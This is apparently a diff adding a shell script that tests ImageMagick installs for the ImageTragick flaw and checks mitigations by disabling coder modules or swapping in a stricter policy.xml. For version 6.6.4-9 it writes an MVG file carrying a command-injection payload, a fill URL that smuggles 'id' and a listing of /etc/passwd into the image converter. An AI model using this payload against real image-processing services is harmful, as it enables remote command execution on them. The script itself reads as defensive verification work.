@@ -1,0 +1,52 @@
+echo "#################"
+cat /etc/redhat-release
+convert -version
+#:<<test
+v0=`convert -version|grep -i version|awk '{print $3}'`
+case "${v0}" in 
+    6.2.8)
+    ls -l vul.gif
+    v01=`cd /usr/lib64/ImageMagick-6.2.8/modules-Q16/coders/;ls -l mvg.so`
+    v02=`cd /usr/lib64/ImageMagick-6.2.8/modules-Q16/coders/;ls -l msl.so`
+    v03=`cd /usr/lib64/ImageMagick-6.2.8/modules-Q16/coders/;ls -l label.so`
+    if [ "${v01}" != "" ] && [ "${v02}" != "" ] && [ "${v03}" != "" ] ;then
+        echo "convert vul.gif 111.png"
+        convert vul.gif 111.png
+        echo "cd /usr/lib64/ImageMagick-6.2.8/modules-Q16/coders/"
+        cd /usr/lib64/ImageMagick-6.2.8/modules-Q16/coders/
+        echo "mv mvg.so mvg.so.bak;mv msl.so msl.so.bak;mv label.so label.so.bak"
+        mv mvg.so mvg.so.bak;mv msl.so msl.so.bak;mv label.so label.so.bak
+        echo "cd"
+        cd
+        echo "convert vul.gif 222.png"
+        convert vul.gif 222.png
+    else 
+        echo "It is the finished!!!"
+    fi
+    ;;
+    6.6.4-9)
+    echo "push graphic-context" > exp1.jpg
+    echo "viewbox 0 0 640 480" >> exp1.jpg
+    echo "fill 'url(https://"|id && ls -al /etc/passwd")'" >> exp1.jpg
+    echo "pop graphic-context" >> exp1.jpg
+    echo "ls -l policy.xml"
+    ls -l policy.xml
+    echo "ls -l exp1.jpg"
+    ls -l exp1.jpg
+    echo "cat exp1.jpg"
+    cat exp1.jpg
+    echo "convert exp1.jpg out.png"
+    convert exp1.jpg out.png
+    echo "cd /usr/local/lib/ImageMagick-6.6.4/config/"
+    cd /usr/local/lib/ImageMagick-6.6.4/config/
+    echo "mv policy.xml policy.xml.bak"
+    mv policy.xml policy.xml.bak
+    echo "cp /root/policy.xml ."
+    cp /root/policy.xml .
+    echo "cd" 
+    cd 
+    echo "convert exp1.jpg out.png"
+    convert exp1.jpg out.png
+    ;;
+esac
+#test
